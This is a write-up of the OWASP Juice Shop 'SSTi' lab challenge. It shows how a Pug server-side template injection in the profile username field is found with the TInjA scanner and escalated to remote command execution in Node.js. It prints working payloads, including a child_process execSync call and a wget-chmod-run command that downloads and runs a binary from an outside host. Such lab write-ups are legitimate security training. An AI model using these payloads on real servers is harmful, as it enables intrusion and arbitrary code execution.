## SSTi

**Category:** Injection

**Difficulty:** 6/6

**Challenge Description:** Infect the server with juicy malware by abusing arbitrary command execution.

## Approach

### Finding Template generated Pages

In order to find a page vulnerable to server-side template injection I had some luck, because I am quite familiar with Angular. The reason why this was helpful is, that the hashtag in the URL is Angular's way to display routes:

![Angular URL](/images/angular-url.png)

Some pages which don't contain a hashtag, are very likely not generated by Angular. Some examples are the /ftp endpoint, but also the /profile endpoint:

![Non Angular URL](/images/template-url.png)

Since /ftp does not contain any user-controlled I decided to focus on /profile.

### Trying my Luck with TInjA

TInjA is a tool, which checks for possible SSTI. It was my first time working with this tool, so it took me quite some research and playing around with the tool until I got a useful result.

But finallly I was able to identify the template engine being used.

```
┌──(orb1t4l㉿elysium)-[~/OWASP/juice-shop/ssti]
└─$ tinja jsonl -j profile_post.jsonl
TInjA v1.1.4 started at 2024-09-25_20-33-58

Analyzing URL(1/1): http://192.168.0.1:3000/profile
===============================================================
Status code 200
Analyzing post parameter  username  =>  test
[*] Value  KM7KDRMKYGB3F6FB  of POST parameter  username  is being reflected 2 time(s) in the response body

[!] The polyglot <%'${{/#{@}}%>{{ triggered an error: Status Code 500
[!] The polyglot p ">[[${{1}}]] was rendered in a modified way: [p &quot;&gt;[[${{1}}]]] (HTML encoded)
[*] The polyglot p ">[[${{1}}]] returned the response(s) [unmodified p &quot;&gt;[[${{1}}]]]
[!] The polyglot <%=1%>@*#{1} was rendered in a modified way: [<%=1%>@*1]
[!] The polyglot <%=1%>@*#{1} was rendered in a modified way: [&lt;%=1%&gt;@*#{1}] (HTML encoded)
[*] The polyglot <%=1%>@*#{1} returned the response(s) [<%=1%>@*1 &lt;%=1%&gt;@*#{1}]
[*] The polyglot {##}/*{{.}}*/ returned the response(s) [unmodified unmodified]

A template injection was detected and the template engine is now being identified.
[!] The polyglot a">##[[${1}]] triggered an error: Status Code 500

Verifying the template injection by issuing template expressions tailored to the specific template engine.
[*] Verifying Pug (Inline).
[*] The polyglot #{7*7} returned the response(s) [unmodified]
[+] A template engine was detected, but could not be identified (certainty: Low)

===============================================================

Successfully finished the scan
[+] Suspected template injections: 1
[+] 0 Very High, 0 High, 0 Medium, 1 Low, 0 Very Low certainty

Duration: 767.866151ms
Average polyglots sent per user input: 5
```

The POST request I used was:

```json
{
  "request": {
    "method": "POST",
    "endpoint": "http://192.168.0.1:3000/profile",
    "body": "username=test",
    "headers": {
      "Cookie": "token=ey..."
    }
  }
}
```

What we have so far is, that the username input field is vulnerable to SSTI and Pug is used as the template engine.

Since it was my first time using this tool, I decided to verify it per hand.

First I changed my username to the polyglot (`a">##[[${1}]]`), which led to the following error page:

![SSTI Pug Error](/images/ssti-pug-error.png)

The last step verifying the SSTI was to change the username to something, that the template engine would actually process. As you can see, the value `#{7*7}` was processed to 49.

![SSTI Verification](/images/ssti-verified.png)

### Crafting the right Payload

Building a working payload definitely took more time (hours...) than expected. After trying some payload from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) I had no other option than return to building the payload by myself.

I started with the [SSTI Exploitation Guide](https://portswigger.net/web-security/server-side-template-injection/exploiting) from PortSwigger. I started simply by trying to access objects used in the mentioned payload sources from above like `root` and `global` to see if they are already loaded. After some time I finally made some progress and found out, that I could access the main module (entry point of the application) of NodeJS.

![SSTI NodeJS MainModule](/images/ssti-mainmodule-access.png)

A great help here, was the `Object.getOwnPropertyNames()` function of NodeJS, because it shows all properties of an object.

My next goal was to check, if I could read from the filesystem, which was successfull with `#{global.process.mainModule.require('fs').readdirSync('.')}`:

![SSTI Successfull Read](/images/ssti-successfull-read.png)

### RCE with SSTI

Since I already knew, that I could use `require()`, it was time to finally a RCE. The first step was to execute the `whoami` command, which I did with `#{global.process.mainModule.require('child_process').execSync('whoami')}`. I wasted some time on trying with just the `exec()` function, but this won't return the actual result, since it is a asynchronous function.

![SSTI RCE whoami](/images/ssti-rce-whoami.png)

To solve the challenge it is necessery to download and execute the *juicy malware*. The command I used for this is `wget https://github.com/juice-shop/juicy-malware/raw/master/juicy_malware_linux_amd_64 && mv juicy_malware_linux_amd_64 malware && chmod +x malware && ./malware`. In order to not freeze the web server you should use `exec()` here.

